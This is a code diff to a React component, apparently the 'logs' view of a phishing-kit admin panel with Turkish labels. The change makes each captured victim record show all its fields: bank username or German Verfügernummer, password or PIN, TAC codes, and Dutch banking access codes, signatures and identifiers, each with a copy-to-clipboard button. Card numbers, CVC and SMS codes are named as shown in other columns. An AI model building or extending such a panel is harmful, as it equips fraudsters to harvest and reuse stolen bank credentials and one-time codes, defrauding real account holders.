@@ -569,9 +569,33 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     <td className="px-3 py-4">
                       <div className="text-[13px] space-y-1.5 max-w-[200px] break-all">
                           {fd.bankName && <div className="font-bold text-yellow-600 dark:text-yellow-500 break-words">{fd.bankName}</div>}
-                          {(fd.username || fd.verfuegernummer) && <div className="flex gap-1.5 items-start"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0">K.Adı</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard((fd.username || fd.verfuegernummer) as string)}>{fd.username || fd.verfuegernummer}</span></div>}
-                          {(fd.password || fd.pin) && <div className="flex gap-1.5 items-start"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0">Şifre</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard((fd.password || fd.pin) as string)}>{fd.password || fd.pin}</span></div>}
-                          {fd.tacCode && <div className="flex gap-1.5 items-start"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0">TAC</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard(fd.tacCode as string)}>{fd.tacCode}</span></div>}
+                          {Object.entries(fd).map(([key, value]) => {
+                            if (!value) return null;
+                            // Standart kolonlarda gösterilenleri atla
+                            if (["firstName", "lastName", "phone", "smsCode", "cardNumber", "cardExpiry", "cardCvc", "bankName", "amount", "step"].includes(key)) return null;
+                            
+                            // Key ismini daha okunabilir yap
+                            let displayKey = key;
+                            if (key === "username" || key === "verfuegernummer") displayKey = "K.Adı";
+                            else if (key === "password" || key === "pin") displayKey = "Şifre";
+                            else if (key === "tacCode") displayKey = "TAC";
+                            else if (key === "rekeningnummer") displayKey = "Hesap No";
+                            else if (key === "pasnummer") displayKey = "Kart No";
+                            else if (key === "toegangscode") displayKey = "Giriş Kodu";
+                            else if (key === "signatuur") displayKey = "İmza";
+                            else if (key === "identificatiecode") displayKey = "Kimlik Kodu";
+                            
+                            return (
+                              <div key={key} className="flex gap-1.5 items-start">
+                                <span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0">
+                                  {displayKey}
+                                </span>
+                                <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={() => copyToClipboard(String(value))}>
+                                  {String(value)}
+                                </span>
+                              </div>
+                            );
+                          })}
                         </div>
                     </td>
                     <td className="px-3 py-4 whitespace-nowrap">
